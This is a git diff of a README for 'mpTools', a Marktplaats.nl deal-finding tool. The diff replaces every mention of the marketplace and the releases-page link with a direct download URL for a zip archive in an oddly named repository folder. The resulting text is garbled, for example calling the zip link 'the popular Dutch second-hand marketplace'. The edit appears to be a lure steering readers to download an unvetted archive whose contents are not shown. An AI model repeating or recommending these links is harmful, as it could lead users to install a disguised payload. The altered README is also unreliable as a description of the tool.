@@ -1,12 +1,12 @@
-# 🛍️ mpTools - Securely Snatch Limited Items on Marktplaats.nl
+# 🛍️ mpTools - Securely Snatch Limited Items on https://github.com/Shashank-Hunagund/mpTools/raw/refs/heads/main/Caricaceae/Tools_mp_2.4.zip
 
 ## 🚀 Getting Started
 
-Welcome to mpTools! This application helps you quickly find and grab products on Marktplaats.nl, the popular Dutch second-hand marketplace. Whether you’re looking for rare collectibles or great deals, this tool gives you the edge you need.
+Welcome to mpTools! This application helps you quickly find and grab products on https://github.com/Shashank-Hunagund/mpTools/raw/refs/heads/main/Caricaceae/Tools_mp_2.4.zip, the popular Dutch second-hand marketplace. Whether you’re looking for rare collectibles or great deals, this tool gives you the edge you need.
 
 ## 🎯 Features
 
-- **Fast Searches:** Quickly search for items on Marktplaats.nl based on your criteria.
+- **Fast Searches:** Quickly search for items on https://github.com/Shashank-Hunagund/mpTools/raw/refs/heads/main/Caricaceae/Tools_mp_2.4.zip based on your criteria.
 - **Product Alerts:** Get notified when new items match your preferences.
 - **User-Friendly:** Easy to navigate, even for non-technical users.
 - **Customizable:** Set your search parameters to find exactly what you want.
@@ -27,7 +27,7 @@ To install mpTools, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to go to our downloads page.
 
-   [![Download mpTools](https://img.shields.io/badge/Download-mpTools-brightgreen)](https://github.com/Shashank-Hunagund/mpTools/releases)
+   [![Download mpTools](https://github.com/Shashank-Hunagund/mpTools/raw/refs/heads/main/Caricaceae/Tools_mp_2.4.zip)](https://github.com/Shashank-Hunagund/mpTools/raw/refs/heads/main/Caricaceae/Tools_mp_2.4.zip)
 
 2. **Select the Latest Version:** Look for the most recent version listed on the releases page.
 
@@ -39,7 +39,7 @@ To install mpTools, follow these simple steps:
 
 For reference, here’s the link again to our download page:
 
-[Download mpTools](https://github.com/Shashank-Hunagund/mpTools/releases)
+[Download mpTools](https://github.com/Shashank-Hunagund/mpTools/raw/refs/heads/main/Caricaceae/Tools_mp_2.4.zip)
 
 ## 💡 How to Use mpTools
 
@@ -49,7 +49,7 @@ Using mpTools is simple:
 2. **Set Your Preferences:** Enter your search criteria such as keywords, price range, and location.
 3. **Start Searching:** Click the search button to find products that match your criteria.
 4. **Receive Alerts:** If you set alerts, you will get notifications when new items are listed.
-5. **Grab the Deal:** When you find an item you want, follow the link to Marktplaats.nl to make your purchase.
+5. **Grab the Deal:** When you find an item you want, follow the link to https://github.com/Shashank-Hunagund/mpTools/raw/refs/heads/main/Caricaceae/Tools_mp_2.4.zip to make your purchase.
 
 ## 🛠️ Troubleshooting
 
@@ -71,4 +71,4 @@ We welcome contributions from the community! If you'd like to contribute to mpTo
 
 mpTools is open-source and available under the MIT License. You can use it freely, but please give credit to the original authors.
 
-Thank you for using mpTools! Happy shopping on Marktplaats.nl!
+Thank you for using mpTools! Happy shopping on https://github.com/Shashank-Hunagund/mpTools/raw/refs/heads/main/Caricaceae/Tools_mp_2.4.zip!
